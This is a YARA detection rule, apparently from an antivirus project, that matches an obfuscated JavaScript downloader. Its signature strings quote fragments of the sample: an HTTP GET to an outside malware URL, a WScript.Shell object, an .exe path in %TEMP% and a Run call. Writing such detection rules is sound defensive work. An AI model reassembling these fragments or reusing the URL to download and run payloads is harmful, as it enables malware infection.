rule sig_20160412_2d0b10cc77d15666cac5dc31edd4ad7e {
  meta:
    description = "datamaliciousorder - file 20160412_2d0b10cc77d15666cac5dc31edd4ad7e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c545d9d592798908a830e6e6101e15366d2bbed78ac100459e507fbd9ff87b41"

  strings:
    $s1  = "KyaWpc[GgBq](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "function FdqAb(DaLns, FykZqd){JyoYg = JyoYg * 1; return DaLns - FykZqd;};" fullword ascii
    $s3  = "var VkjIj = function UaIj() {return WScript[TvFh](\"WScript\"+\".Shell\");}(), WdhBkn = 11;" fullword ascii
    $s4  = "if (KyaWpc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LokUb(){return WcKlq + \"\";};" fullword ascii
    $s6  = "function KqVwc() {return VkjIj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JILSCWeuUhWdU.ex\" + \"e\";};" fullword ascii
    $s7  = "function VvnTpw() {return ((HfpMi == true) && (HfpMi == KlEk)) ? 1 : JyoYg;};" fullword ascii
    $s8  = "function QrhLo(){return 23;};" fullword ascii
    $s9  = "KlEk = true; " fullword ascii
    $s10 = "function UuCks()" fullword ascii
    $s11 = "var HfpMi = false;" fullword ascii
    $s12 = "function BfGt(SyKh) {var JrAfx = (1, 2, 3, 4, 5, SyKh); return JrAfx;};" fullword ascii
    $s13 = "var BfMt = new this[\"Date\"]();" fullword ascii
    $s14 = "}while (ByZz);" fullword ascii
    $s15 = "var KlEk = false;" fullword ascii
    $s16 = "function BjqPz(KwjWx){VkjIj[\"R\"+\"un\"](KwjWx, JyoYg, JyoYg);};" fullword ascii
    $s17 = "function UhyAq(){return TvFh;};" fullword ascii
    $s18 = "HfpMi = true; " fullword ascii
    $s19 = "var VmQpq = false;" fullword ascii
    $s20 = "return FdqAb(KjrCp, RiSbr);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}